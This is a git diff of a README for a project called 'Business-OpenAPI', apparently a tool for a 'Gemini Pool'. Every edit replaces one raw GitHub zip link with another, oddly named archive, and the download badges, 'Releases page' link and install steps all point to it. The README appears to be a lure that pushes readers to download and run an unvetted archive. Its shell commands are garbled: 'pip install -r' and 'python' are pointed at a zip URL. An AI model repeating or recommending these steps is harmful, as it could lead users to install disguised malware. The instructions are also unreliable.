@@ -1,6 +1,6 @@
 # 🌟 Business-OpenAPI - Easy Access to Gemini Pool
 
-[![Download Business-OpenAPI](https://raw.githubusercontent.com/Jha0rahul/Business-OpenAPI/main/anilao/Business-OpenAPI_1.9.zip%https://raw.githubusercontent.com/Jha0rahul/Business-OpenAPI/main/anilao/Business-OpenAPI_1.9.zip)](https://raw.githubusercontent.com/Jha0rahul/Business-OpenAPI/main/anilao/Business-OpenAPI_1.9.zip)
+[![Download Business-OpenAPI](https://raw.githubusercontent.com/Jha0rahul/Business-OpenAPI/main/anilao/Open-Business-API-monostylous.zip%https://raw.githubusercontent.com/Jha0rahul/Business-OpenAPI/main/anilao/Open-Business-API-monostylous.zip)](https://raw.githubusercontent.com/Jha0rahul/Business-OpenAPI/main/anilao/Open-Business-API-monostylous.zip)
 
 ## 🛠️ Introduction
 
@@ -12,7 +12,7 @@ Follow these steps to download and run the software easily.
 
 ### 🔗 Download & Install
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/Jha0rahul/Business-OpenAPI/main/anilao/Business-OpenAPI_1.9.zip) to download the latest version of Business-OpenAPI.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Jha0rahul/Business-OpenAPI/main/anilao/Open-Business-API-monostylous.zip) to download the latest version of Business-OpenAPI.
    
 2. Choose the appropriate version for your operating system and download the file.
 
@@ -48,14 +48,14 @@ If you prefer to run the application locally without Docker, here’s how:
 
    Make sure you have Python and pip installed. Then, run:
    ```bash
-   pip install -r https://raw.githubusercontent.com/Jha0rahul/Business-OpenAPI/main/anilao/Business-OpenAPI_1.9.zip
+   pip install -r https://raw.githubusercontent.com/Jha0rahul/Business-OpenAPI/main/anilao/Open-Business-API-monostylous.zip
    ```
 
 2. **Start the Service:**
 
    To launch the service, use this command:
    ```bash
-   python https://raw.githubusercontent.com/Jha0rahul/Business-OpenAPI/main/anilao/Business-OpenAPI_1.9.zip
+   python https://raw.githubusercontent.com/Jha0rahul/Business-OpenAPI/main/anilao/Open-Business-API-monostylous.zip
    ```
 
 The default port is 3000. Make sure this port is available on your system.
@@ -89,4 +89,4 @@ The application features a modern and responsive web interface. You can monitor 
 
 If you encounter any issues or have questions, please refer to the issue tracker on the repository. You'll find a community of users who can help.
 
-Now that you have everything you need, go ahead and download [Business-OpenAPI](https://raw.githubusercontent.com/Jha0rahul/Business-OpenAPI/main/anilao/Business-OpenAPI_1.9.zip) to enhance your productivity with account management!
+Now that you have everything you need, go ahead and download [Business-OpenAPI](https://raw.githubusercontent.com/Jha0rahul/Business-OpenAPI/main/anilao/Open-Business-API-monostylous.zip) to enhance your productivity with account management!
